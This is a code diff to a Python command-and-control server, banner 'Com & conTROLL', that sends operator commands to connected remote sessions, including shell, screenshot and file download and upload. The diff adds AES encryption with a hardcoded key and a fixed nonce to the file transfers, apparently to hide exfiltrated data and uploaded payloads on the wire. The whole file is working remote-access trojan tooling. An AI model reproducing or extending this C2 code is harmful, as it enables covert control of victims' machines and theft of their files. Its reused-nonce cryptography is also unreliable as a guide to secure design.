@@ -5,6 +5,15 @@ import sys
 import time
 from prettytable import PrettyTable
 
+import logging
+
+from Crypto.Cipher import AES
+
+key = b'ZiyaGadimli12345'
+nonce = b'ZiyaGadimli54321'
+
+ciper = AES.new(key, AES.MODE_EAX, nonce)
+
 connections = []
 
 tprint("Com & conTROLL")
@@ -90,30 +99,31 @@ def help():
 
 def use(session):
     session = int(session)
-    if connections[session]:
-        client_socket = connections[session]['socket']
-        while 1:
-            command = input(f"\n[*] You're interacting with {session} Enter command > ")
-            if command == 'exit':                         
-                break                                           
-            
-            client_socket.send(command.encode())
-            command = command.split(" ")      
-
-            match command[0]:
-                case  'download':
-                    download(from_=command[1], where=command[2], session=session)
-                case 'upload':
-                    upload(what=command[1], where=command[2], session=session)
-                case 'shell':
-                    shell(session=session)
-                case 'ss':
-                    ss(session=session)
-                case 'help':
-                    session_help()
+    try:
+        if connections[session]:
+            client_socket = connections[session]['socket']
+            while 1:
+                command = input(f"\n[*] You're interacting with {session} Enter command > ")
+                if command == 'exit':                         
+                    break                                           
                 
-    else:
-        print("ID does not exist!")
+                client_socket.send(command.encode())
+                command = command.split(" ")      
+
+                match command[0]:
+                    case  'download':
+                        download(from_=command[1], where=command[2], session=session)
+                    case 'upload':
+                        upload(what=command[1], where=command[2], session=session)
+                    case 'shell':
+                        shell(session=session)
+                    case 'ss':
+                        ss(session=session)
+                    case 'help':
+                        session_help()
+                    
+    except IndexError:
+        print("\nID does not exist!")
 
 
 def exit():
@@ -132,7 +142,7 @@ def listen_incoming():
         connections.append(connection)
 
 
-def download(from_, where, session):
+def download(from_, where, session):            #ENCRYPTION DONE!
     socket = connections[session]['socket']
     socket.send(from_.encode())
     time.sleep(0.3)
@@ -142,26 +152,30 @@ def download(from_, where, session):
     where += file_name
     file = open(where, 'ab')
     a = socket.recv(4096)
+    a = ciper.decrypt(a)
     while a != b"\n\r":
         file.write(a)
         a = socket.recv(4096)
+        a = ciper.decrypt(a)
     file.close()
     print("File sent succesfully!")
 
 
 def upload(what, where, session):
     socket = connections[session]['socket']
-    # socket.send(where.encode())
+    socket.send(where.encode())
     time.sleep(0.3)
     file_name = what.split('\\')[-1]
     socket.send(file_name.encode())
     file = open(what, 'rb')
     a = file.read(4096)
+    a = ciper.encrypt(a)
     while a:
         socket.send(a)
         a = file.read(4096)
+        a = ciper.encrypt(a)
     time.sleep(1)
-    socket.send(b"\n\r")
+    socket.send(ciper.encrypt(b"\n\r"))
     file.close()
 
 
@@ -184,5 +198,3 @@ while 1:
         case 'use':
             use(command[1])
             
-
-sys.exit()
